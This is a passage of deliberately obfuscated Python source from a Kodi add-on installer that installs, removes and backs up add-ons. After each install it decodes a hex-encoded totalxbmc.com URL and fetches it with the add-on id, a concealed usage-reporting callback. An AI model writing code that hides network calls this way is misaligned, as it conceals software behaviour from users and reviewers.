 o0O00Oo0 = re . compile ( 'video_label7="(.+?)"' ) . findall ( ooOOoooooo )
 IiII111i1i11 = re . compile ( 'video_label8="(.+?)"' ) . findall ( ooOOoooooo )
 i111iIi1i1II1 = re . compile ( 'video_label9="(.+?)"' ) . findall ( ooOOoooooo )
 oooO = re . compile ( 'video_label10="(.+?)"' ) . findall ( ooOOoooooo )
 if 26 - 26: OoO0O00 % Ooo0Oo0
 if 76 - 76: O0oO * ooOO0o
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 o0oooOO00 = i1II1Iiii1I11 [ 0 ] if ( len ( i1II1Iiii1I11 ) > 0 ) else ''
 iiIiii1IIIII = IIII [ 0 ] if ( len ( IIII ) > 0 ) else ''
 o00o = iiIiI [ 0 ] if ( len ( iiIiI ) > 0 ) else ''
 IIIIiiIiiI = o00oooO0Oo [ 0 ] if ( len ( o00oooO0Oo ) > 0 ) else ''
 IIIIiI11I11 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 oo00o0 = iiIiII1 [ 0 ] if ( len ( iiIiII1 ) > 0 ) else ''
 i11II1I11I1 = OOO00O0O [ 0 ] if ( len ( OOO00O0O ) > 0 ) else ''
 OOoOO0ooo = iii [ 0 ] if ( len ( iii ) > 0 ) else ''
 if 30 - 30: iii11I111 - o0oO % I1i1iii + Oo000o * Ii1iIIIi1ii
 o0ooooO0o0O = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + IIi [ 0 ] if ( len ( IIi ) > 0 ) else ''
 iiIi11iI1iii = i1Iii1i1I [ 0 ] if ( len ( i1Iii1i1I ) > 0 ) else ''
 oo000 = OOoO00 [ 0 ] if ( len ( OOoO00 ) > 0 ) else ''
 o0000oO = '[CR]' + IiI111111IIII [ 0 ] if ( len ( IiI111111IIII ) > 0 ) else ''
 iI1i111I1Ii = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + i1Ii [ 0 ] if ( len ( i1Ii ) > 0 ) else ''
 if 25 - 25: i1OOO - ooOO0o
 Ii1I = I1iI1iIi111i [ 0 ] if ( len ( I1iI1iIi111i ) > 0 ) else ''
 o0OO0o0o00o = iiIi1IIi1I [ 0 ] if ( len ( iiIi1IIi1I ) > 0 ) else ''
 oOo0 = o0OoOO000ooO0 [ 0 ] if ( len ( o0OoOO000ooO0 ) > 0 ) else ''
 OOOoOO = o0o0o0oO0oOO [ 0 ] if ( len ( o0o0o0oO0oOO ) > 0 ) else ''
 I11IIIi = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + ii1Ii11I [ 0 ] if ( len ( ii1Ii11I ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 iIIiiI1II1i11 = o00o0 [ 0 ] if ( len ( o00o0 ) > 0 ) else ''
 license = ii [ 0 ] if ( len ( ii ) > 0 ) else ''
 o0o0 = '[COLOR=gold]     Platform: [/COLOR]' + OOooooO0Oo [ 0 ] if ( len ( OOooooO0Oo ) > 0 ) else ''
 IIii1111 = OO [ 0 ] if ( len ( OO ) > 0 ) else ''
 I1iI = iIiIIi1 [ 0 ] if ( len ( iIiIIi1 ) > 0 ) else ''
 IIIIiIiIi1 = I1IIII1i [ 0 ] if ( len ( I1IIII1i ) > 0 ) else ''
 I11iiiiI1i = I1I11i [ 0 ] if ( len ( I1I11i ) > 0 ) else ''
 iI1i11 = Ii1I1I1i1Ii [ 0 ] if ( len ( Ii1I1I1i1Ii ) > 0 ) else ''
 OoOOoooOO0O = i1Oo0oO00o [ 0 ] if ( len ( i1Oo0oO00o ) > 0 ) else ''
 ooo00Ooo = i11I1II1I11i [ 0 ] if ( len ( i11I1II1I11i ) > 0 ) else ''
 Oo0o0O00 = OooOoOO0 [ 0 ] if ( len ( OooOoOO0 ) > 0 ) else ''
 ii1I1i11 = OOOoo0OO [ 0 ] if ( len ( OOOoo0OO ) > 0 ) else ''
 iIii1 = Iii1IIII11I [ 0 ] if ( len ( Iii1IIII11I ) > 0 ) else ''
 OOo0O0oo0OO0O = oO0o0 [ 0 ] if ( len ( oO0o0 ) > 0 ) else ''
 OO0 = iI1Ii11iIiI1 [ 0 ] if ( len ( iI1Ii11iIiI1 ) > 0 ) else ''
 o0Oooo = iI1i11iII111 [ 0 ] if ( len ( iI1i11iII111 ) > 0 ) else ''
 iiI = OO0Oooo0oOO0O [ 0 ] if ( len ( OO0Oooo0oOO0O ) > 0 ) else ''
 oOIIiIi = o00O0 [ 0 ] if ( len ( o00O0 ) > 0 ) else ''
 OOoOooOoOOOoo = oOO0O00Oo0O0o [ 0 ] if ( len ( oOO0O00Oo0O0o ) > 0 ) else ''
 Iiii1iI1i = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else ''
 I1ii1ii11i1I = I1iIIiiIIi1i [ 0 ] if ( len ( I1iIIiiIIi1i ) > 0 ) else ''
 o0OoOO = O0O0ooOOO [ 0 ] if ( len ( O0O0ooOOO ) > 0 ) else ''
 O0O0Oo00 = oOOo0O00o [ 0 ] if ( len ( oOOo0O00o ) > 0 ) else ''
 oOoO00o = iIiIi11 [ 0 ] if ( len ( iIiIi11 ) > 0 ) else ''
 oO00O0 = OOO [ 0 ] if ( len ( OOO ) > 0 ) else 'None'
 IIi1IIIi = iiiiI [ 0 ] if ( len ( iiiiI ) > 0 ) else 'None'
 O00Ooo = oooOo0OOOoo0 [ 0 ] if ( len ( oooOo0OOOoo0 ) > 0 ) else 'None'
 OOOO0OOO = OOoO [ 0 ] if ( len ( OOoO ) > 0 ) else 'None'
 i1i1ii = OO0O000 [ 0 ] if ( len ( OO0O000 ) > 0 ) else 'None'
 iII1ii1 = iiIiI1i1 [ 0 ] if ( len ( iiIiI1i1 ) > 0 ) else 'None'
 I1i1iiiI1 = oO0O00oOOoooO [ 0 ] if ( len ( oO0O00oOOoooO ) > 0 ) else 'None'
 iIIi = IiIi11iI [ 0 ] if ( len ( IiIi11iI ) > 0 ) else 'None'
 oO0o00oo0 = Oo0O00O000 [ 0 ] if ( len ( Oo0O00O000 ) > 0 ) else 'None'
 ii1IIII = i11I1IiII1i1i [ 0 ] if ( len ( i11I1IiII1i1i ) > 0 ) else 'None'
 oO00oOooooo0 = oo [ 0 ] if ( len ( oo ) > 0 ) else 'None'
 oOo = I1111i [ 0 ] if ( len ( I1111i ) > 0 ) else 'None'
 O0OOooOoO = iIIii [ 0 ] if ( len ( iIIii ) > 0 ) else 'None'
 i1II1I1Iii1 = o00O0O [ 0 ] if ( len ( o00O0O ) > 0 ) else 'None'
 iiI11Iii = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else 'None'
 O0o0O0 = Iii1I1111ii [ 0 ] if ( len ( Iii1I1111ii ) > 0 ) else 'None'
 Ii1II1I11i1 = ooOoO00 [ 0 ] if ( len ( ooOoO00 ) > 0 ) else 'None'
 oOoooooOoO = Ii1IIiI1i [ 0 ] if ( len ( Ii1IIiI1i ) > 0 ) else 'None'
 Ii111 = o0O00Oo0 [ 0 ] if ( len ( o0O00Oo0 ) > 0 ) else 'None'
 I111i1i1111 = IiII111i1i11 [ 0 ] if ( len ( IiII111i1i11 ) > 0 ) else 'None'
 IIII1 = i111iIi1i1II1 [ 0 ] if ( len ( i111iIi1i1II1 ) > 0 ) else 'None'
 I1I1i = oooO [ 0 ] if ( len ( oooO ) > 0 ) else 'None'
 if o0000oO != '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
 elif oo000 == '' and iiIi11iI1iii == '' and OOo0O0oo0OO0O == '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
 elif oo000 == '' and iiIi11iI1iii == '' and OOo0O0oo0OO0O != '' and o0000oO == '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
 elif oo000 == '' and iiIi11iI1iii != '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + iiIi11iI1iii
 elif oo000 != '' and iiIi11iI1iii == '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at [COLOR=lime]www.totalxbmc.tv[/COLOR][CR][COLOR=dodgerblue]User Comments: [/COLOR]' + oo000
 elif oo000 != '' and iiIi11iI1iii != '' :
  I1IIIiIiIi = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at [COLOR=lime]www.totalxbmc.tv[/COLOR][CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + iiIi11iI1iii + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + oo000
 IIIII1 = str ( '[COLOR=gold]Name: [/COLOR]' + ooooooo00o + '[COLOR=gold]     Author(s): [/COLOR]' + o00o + '[COLOR=gold][CR][CR]Version: [/COLOR]' + IIIIiiIiiI + '[COLOR=gold]     Created: [/COLOR]' + IIIIiI11I11 + '[COLOR=gold]     Updated: [/COLOR]' + i11II1I11I1 + '[COLOR=gold][CR][CR]Repository: [/COLOR]' + iIIiiI1II1i11 + o0o0 + '[COLOR=gold]     Add-on Type(s): [/COLOR]' + oo00o0 + o0OoOO + I1IIIiIiIi + o0000oO + OOo0O0oo0OO0O + I11IIIi + o0ooooO0o0O + iI1i111I1Ii )
 if 5 - 5: OoO0O00
 if ( oo000 == '' ) and ( iiIi11iI1iii == '' ) and ( o0000oO == '' ) and ( OOo0O0oo0OO0O == '' ) :
  Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=lime] No problems reported[/COLOR]' , IIIII1 , 'text_guide' , oOoO00o , '' , '' , IIIII1 )
 if ( oo000 != '' and o0000oO == '' ) or ( iiIi11iI1iii != '' and o0000oO == '' ) or ( OOo0O0oo0OO0O != '' and o0000oO == '' ) :
  Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , IIIII1 , 'text_guide' , oOoO00o , '' , '' , IIIII1 )
 if o0000oO != '' :
  Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , IIIII1 , 'text_guide' , oOoO00o , '' , '' , IIIII1 )
 if o0000oO == '' :
  ii1ii1ii ( '[COLOR=lime][INSTALL] [/COLOR]' + ooooooo00o , ooooooo00o , '' , 'addon_install' , 'Install.png' , '' , '' , o0ooooO0o0O , oOo0 , Ii1I , iIIiiI1II1i11 , iiIiii1IIIII , o00o , I11IIIi , o0OO0o0o00o )
 if oO00O0 != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , O00Ooo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if O00Ooo != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + O0OOooOoO , O00Ooo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if OOOO0OOO != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i1II1I1Iii1 , OOOO0OOO , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if i1i1ii != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iiI11Iii , i1i1ii , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if iII1ii1 != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + O0o0O0 , iII1ii1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if I1i1iiiI1 != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + Ii1II1I11i1 , I1i1iiiI1 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if iIIi != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oOoooooOoO , iIIi , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if oO0o00oo0 != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + Ii111 , oO0o00oo0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if ii1IIII != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I111i1i1111 , ii1IIII , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if oO00oOooooo0 != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIII1 , oO00oOooooo0 , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
 if oOo != 'None' :
  Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I1I1i , oOo , 'play_video' , 'Video_Guide.png' , '' , '' , '' )
  if 46 - 46: O0oO
  if 45 - 45: oO00Oo0o000
def IIiooO0oOo0o ( ) :
 Ii ( 'folder' , 'Anime' , '&genre=anime' , 'grab_addons' , 'anime.png' , '' , '' , '' )
 Ii ( 'folder' , 'Audiobooks' , '&genre=audiobooks' , 'grab_addons' , 'audiobooks.png' , '' , '' , '' )
 Ii ( 'folder' , 'Comedy' , '&genre=comedy' , 'grab_addons' , 'comedy.png' , '' , '' , '' )
 Ii ( 'folder' , 'Comics' , '&genre=comics' , 'grab_addons' , 'comics.png' , '' , '' , '' )
 Ii ( 'folder' , 'Documentary' , '&genre=documentary' , 'grab_addons' , 'documentary.png' , '' , '' , '' )
 Ii ( 'folder' , 'Downloads' , '&genre=downloads' , 'grab_addons' , 'downloads.png' , '' , '' , '' )
 Ii ( 'folder' , 'Food' , '&genre=food' , 'grab_addons' , 'food.png' , '' , '' , '' )
 Ii ( 'folder' , 'Gaming' , '&genre=gaming' , 'grab_addons' , 'gaming.png' , '' , '' , '' )
 Ii ( 'folder' , 'Health' , '&genre=health' , 'grab_addons' , 'health.png' , '' , '' , '' )
 Ii ( 'folder' , 'How To...' , '&genre=howto' , 'grab_addons' , 'howto.png' , '' , '' , '' )
 Ii ( 'folder' , 'Kids' , '&genre=kids' , 'grab_addons' , 'kids.png' , '' , '' , '' )
 Ii ( 'folder' , 'Live TV' , '&genre=livetv' , 'grab_addons' , 'livetv.png' , '' , '' , '' )
 Ii ( 'folder' , 'Movies' , '&genre=movies' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 Ii ( 'folder' , 'Music' , '&genre=music' , 'grab_addons' , 'music.png' , '' , '' , '' )
 Ii ( 'folder' , 'News' , '&genre=news' , 'grab_addons' , 'news.png' , '' , '' , '' )
 Ii ( 'folder' , 'Photos' , '&genre=photos' , 'grab_addons' , 'photos.png' , '' , '' , '' )
 Ii ( 'folder' , 'Podcasts' , '&genre=podcasts' , 'grab_addons' , 'podcasts.png' , '' , '' , '' )
 Ii ( 'folder' , 'Radio' , '&genre=radio' , 'grab_addons' , 'radio.png' , '' , '' , '' )
 Ii ( 'folder' , 'Religion' , '&genre=religion' , 'grab_addons' , 'religion.png' , '' , '' , '' )
 Ii ( 'folder' , 'Space' , '&genre=space' , 'grab_addons' , 'space.png' , '' , '' , '' )
 Ii ( 'folder' , 'Sports' , '&genre=sports' , 'grab_addons' , 'sports.png' , '' , '' , '' )
 Ii ( 'folder' , 'Technology' , '&genre=tech' , 'grab_addons' , 'tech.png' , '' , '' , '' )
 Ii ( 'folder' , 'Trailers' , '&genre=trailers' , 'grab_addons' , 'trailers.png' , '' , '' , '' )
 Ii ( 'folder' , 'TV Shows' , '&genre=tv' , 'grab_addons' , 'tv.png' , '' , '' , '' )
 Ii ( 'folder' , 'Misc.' , '&genre=other' , 'grab_addons' , 'other.png' , '' , '' , '' )
 if OO0o . getSetting ( 'adult' ) == 'true' :
  Ii ( 'folder' , 'XXX' , '&genre=adult' , 'grab_addons' , 'adult.png' , '' , '' , '' )
  if 66 - 66: OoOo . o0oO . i11iIiiIii % ooOO0o % oO00Oo0o000
  if 43 - 43: O0OOO
def Ii1 ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 print "############# ADDON INSTALL #################"
 forum = str ( forum )
 repo_id = str ( repo_id )
 Ii1iIiII1Ii = 1
 Iii1II1iiiiI = 1
 O00OoOO0oo0 = 1
 oOO = xbmc . translatePath ( os . path . join ( OO0oOoo , name + '.zip' ) )
 O0o0OO0000ooo = xbmc . translatePath ( os . path . join ( o0oO0 , addon_id ) )
 ooOo . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 try :
  downloader . download ( repo_link , oOO , ooOo )
  iIIII1iIIii ( oOO , II11iiii1Ii , ooOo )
 except :
  try :
   downloader . download ( zip_link , oOO , ooOo )
   iIIII1iIIii ( oOO , II11iiii1Ii , ooOo )
  except :
   try :
    if not os . path . exists ( O0o0OO0000ooo ) :
     os . makedirs ( O0o0OO0000ooo )
    ooOOoooooo = II1I ( data_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    oOOO00o000o = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( ooOOoooooo )
    for iIi11i1 in oOOO00o000o :
     oO00oo0o00o0o = xbmc . translatePath ( os . path . join ( O0o0OO0000ooo , iIi11i1 ) )
     if addon_id not in iIi11i1 and '/' not in iIi11i1 :
      try :
       ooOo . update ( 0 , "Downloading [COLOR=yellow]" + iIi11i1 + '[/COLOR]' , '' , 'Please wait...' )
       print "downloading: " + data_path + iIi11i1
       downloader . download ( data_path + iIi11i1 , oO00oo0o00o0o , ooOo )
      except : print "failed to install" + iIi11i1
     if '/' in iIi11i1 and '..' not in iIi11i1 and 'http' not in iIi11i1 :
      IiIIIIIi = data_path + iIi11i1
      IiIi1iIIi1 ( oO00oo0o00o0o , IiIIIIIi )
   except :
    IiI . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=yellow]' + name , '[/COLOR]Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
    Ii1iIiII1Ii = 0
 if Ii1iIiII1Ii == 1 :
  time . sleep ( 1 )
  ooOo . update ( 0 , "[COLOR=yellow]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  O0OoO0ooOO0o = xbmc . translatePath ( os . path . join ( o0oO0 , repo_id ) )
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( O0OoO0ooOO0o ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   OoOo0oOooOoOO ( repo_id )
  oo00ooOoO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
  o00oOoOo0 = binascii . unhexlify ( oo00ooOoO00 ) % ( addon_id )
  II1I ( o00oOoOo0 )
  o0O0O0ooo0oOO ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if Iii1II1iiiiI == 0 :
   IiI . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
  if O00OoOO0oo0 == 0 :
   IiI . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
  if O00OoOO0oo0 != 0 and Iii1II1iiiiI != 0 and forum != 'None' :
   IiI . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=yellow]' + forum , '[/COLOR][CR]Remember to visit [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] for all your Kodi needs.' )
  if O00OoOO0oo0 != 0 and Iii1II1iiiiI != 0 and forum == 'None' :
   IiI . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given but' , 'we\'ll be happy to help at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
   if 97 - 97: iiIi / ooOO0o
   if 71 - 71: I1i1iii / o0oO . Ooo0Oo0 % Iii1i1I11I . OoOo
def Iiiiii111i1ii ( ) :
 for file in glob . glob ( os . path . join ( o0oO0 , '*' ) ) :
  ooooooo00o = str ( file ) . replace ( o0oO0 , '[COLOR=red]REMOVE [/COLOR]' ) . replace ( 'plugin.' , '[COLOR=dodgerblue](PLUGIN) [/COLOR]' ) . replace ( 'audio.' , '' ) . replace ( 'video.' , '' ) . replace ( 'skin.' , '[COLOR=yellow](SKIN) [/COLOR]' ) . replace ( 'repository.' , '[COLOR=orange](REPOSITORY) [/COLOR]' ) . replace ( 'script.' , '[COLOR=cyan](SCRIPT) [/COLOR]' ) . replace ( 'metadata.' , '[COLOR=gold](METADATA) [/COLOR]' ) . replace ( 'service.' , '[COLOR=pink](SERVICE) [/COLOR]' ) . replace ( 'weather.' , '[COLOR=green](WEATHER) [/COLOR]' ) . replace ( 'module.' , '[COLOR=gold](MODULE) [/COLOR]' )
  i1i1iII1 = ( os . path . join ( file , 'icon.png' ) )
  iii11i1IIII = ( os . path . join ( file , 'fanart.jpg' ) )
  Ii ( '' , ooooooo00o , file , 'remove_addons' , i1i1iII1 , iii11i1IIII , '' , '' )
  if 26 - 26: O0OOO . II11iII * i1OOO . iiIi % i11iIiiIii
  if 47 - 47: ooOO0o - iiiIi1i1I
def Iiii ( ) :
 OO0o . openSettings ( sys . argv [ 0 ] )
 if 89 - 89: OOO00OoOO00
 if 25 - 25: Ooo0Oo0 + O0OOO
def i1II ( ) :
 Ii ( '' , '[B][COLOR=blue]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Total Installer[/COLOR][/B] Storage Folder Check' , 'url' , 'check_storage' , 'Check_Download.png' , '' , '' , '' )
 Ii ( 'folder' , 'Completely remove an add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , 'Remove_Addon.png' , '' , '' , '' )
 Ii ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , 'Gotham_Compatible.png' , '' , '' , '' )
 Ii ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , 'Kodi_Compatible.png' , '' , '' , '' )
 Ii ( '' , 'Hide my add-on passwords' , 'none' , 'hide_passwords' , 'Hide_Passwords.png' , '' , '' , '' )
 if Oo0O == 'true' :
  Ii ( 'folder' , 'OnTapp.TV / OSS Integration' , 'none' , 'addonfix' , 'Addon_Fixes.png' , '' , '' , '' )
 Ii ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 Ii ( '' , 'Unhide my add-on passwords' , 'none' , 'unhide_passwords' , 'Unhide_Passwords.png' , '' , '' , '' )
 Ii ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , 'Update_Addons.png' , '' , '' , '' )
 Ii ( '' , 'Wipe All Add-on Settings (addon_data)' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 if 81 - 81: OoO0O00 * iii11I111 + i1OOO + iiiIi1i1I - Iii1i1I11I
 if 32 - 32: OoO0O00 * O0OOO
def O00oOo00o0o ( welcometext ) :
 Ii ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search By Name' , 'name=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search By Author' , 'author=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=yellow][Manual Search][/COLOR] Search In Description' , 'desc=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Genres' , '' , 'addon_genres' , 'Search_Genre.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Countries' , '' , 'addon_countries' , 'Search_Country.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime][Filter Results][/COLOR] By Kodi Categories' , '' , 'addon_categories' , 'Search_Category.png' , '' , '' , '' )
 if ( OOOo0 in welcometext ) and ( 'elc' in welcometext ) :
  Ii ( 'folder' , '[COLOR=dodgerblue]Install Popular Packs[/COLOR]' , 'none' , 'popular' , 'Addon_Packs.png' , '' , '' , '' )
  if 85 - 85: ooOO0o + Iii1i1I11I * ooOO0o - i1OOO % i11iIiiIii
  if 71 - 71: Ooo0Oo0 - oO00Oo0o000 / OoOo * OoOo / o0oO . o0oO
def all ( _in , _out , dp = None ) :
 if dp :
  return ooo000ooO0000 ( _in , _out , dp )
  if 97 - 97: iiiIi1i1I * iiIi . Ii1iIIIi1ii
 return I1Ii1111iIi ( _in , _out )
 if 31 - 31: Oo000o . i1OOO * oO00Oo0o000 + i11iIiiIii * OOO00OoOO00
 if 93 - 93: Ooo0Oo0 / Ii1iIIIi1ii * o0oO % Iii1i1I11I * O0OOO * Oo000o
def I1Ii1111iIi ( _in , _out ) :
 try :
  Ooooooo = zipfile . ZipFile ( _in , 'r' )
  Ooooooo . extractall ( _out )
 except Exception , Oo0O0O0ooO0O :
  print str ( Oo0O0O0ooO0O )
  return False
 return True
 if 39 - 39: O0oO * iiiIi1i1I + Ii1iIIIi1ii - O0oO + oOOoO0O0O0
 if 69 - 69: O0OOO
def ooo000ooO0000 ( _in , _out , dp ) :
 Ooooooo = zipfile . ZipFile ( _in , 'r' )
 o0ooO = float ( len ( Ooooooo . infolist ( ) ) )
 OoOOOo0o0ooo = 0
 try :
  for I1iiiiI1iI in Ooooooo . infolist ( ) :
   OoOOOo0o0ooo += 1
   iIiiiii1i = OoOOOo0o0ooo / o0ooO * 100
   dp . update ( int ( iIiiiii1i ) )
   Ooooooo . extract ( I1iiiiI1iI , _out )
 except Exception , Oo0O0O0ooO0O :
  print str ( Oo0O0O0ooO0O )
  return False
 return True
 if 40 - 40: O0OOO - Iii1i1I11I - O0oO
 if 37 - 37: OoOo / I1i1iii / O0OOO
def OOOO00OO0O0 ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 i1I111Ii1i11 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 o0O0O0o = len ( sourcefile )
 OOiI11I = [ ]
 ooO000 = [ ]
 ooOo . create ( message_header , message1 , message2 , message3 )
 for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( sourcefile ) :
  for file in i1i1i1I :
   ooO000 . append ( file )
 oOoo000 = len ( ooO000 )
 for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( sourcefile ) :
  IiIi1ii111i1 [ : ] = [ OooOo00o for OooOo00o in IiIi1ii111i1 if OooOo00o not in exclude_dirs ]
  i1i1i1I [ : ] = [ IiI11i1IIiiI for IiI11i1IIiiI in i1i1i1I if IiI11i1IIiiI not in exclude_files ]
  for file in i1i1i1I :
   OOiI11I . append ( file )
   oOOo000oOoO0 = len ( OOiI11I ) / float ( oOoo000 ) * 100
   ooOo . update ( int ( oOOo000oOoO0 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   OoOo00o0OO = os . path . join ( oOOOO , file )
   if not 'temp' in IiIi1ii111i1 :
    if not 'plugin.program.totalinstaller' in IiIi1ii111i1 :
     import time
     ii1IIIIiI11 = '01/01/1980'
     iI1IIIii = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( OoOo00o0OO ) ) )
     if iI1IIIii > ii1IIIIiI11 :
      i1I111Ii1i11 . write ( OoOo00o0OO , OoOo00o0OO [ o0O0O0o : ] )
 i1I111Ii1i11 . close ( )
 ooOo . close ( )
 if 7 - 7: O0oO - Oo000o / I1i1iii * OoO0O00 . ooOO0o * ooOO0o
 if 61 - 61: Oo000o % oO00Oo0o000 - II11iII / iiiIi1i1I
def Ii1iI111 ( sourcefile , destfile ) :
 i1I111Ii1i11 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 o0O0O0o = len ( sourcefile )
 OOiI11I = [ ]
 ooO000 = [ ]
 ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Archiving..." , '' , 'Please Wait' )
 for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( sourcefile ) :
  for file in i1i1i1I :
   ooO000 . append ( file )
 oOoo000 = len ( ooO000 )
 for oOOOO , IiIi1ii111i1 , i1i1i1I in os . walk ( sourcefile ) :
  for file in i1i1i1I :
   OOiI11I . append ( file )
   oOOo000oOoO0 = len ( OOiI11I ) / float ( oOoo000 ) * 100
   ooOo . update ( int ( oOOo000oOoO0 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   OoOo00o0OO = os . path . join ( oOOOO , file )
   if not 'temp' in IiIi1ii111i1 :
    if not 'plugin.program.totalinstaller' in IiIi1ii111i1 :
     import time
     ii1IIIIiI11 = '01/01/1980'
     iI1IIIii = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( OoOo00o0OO ) ) )
     if iI1IIIii > ii1IIIIiI11 :
      i1I111Ii1i11 . write ( OoOo00o0OO , OoOo00o0OO [ o0O0O0o : ] )
 i1I111Ii1i11 . close ( )
 ooOo . close ( )
 if 51 - 51: O0oO * O0OOO / I1i1iii . OoO0O00 % oOOoO0O0O0 / iiIi
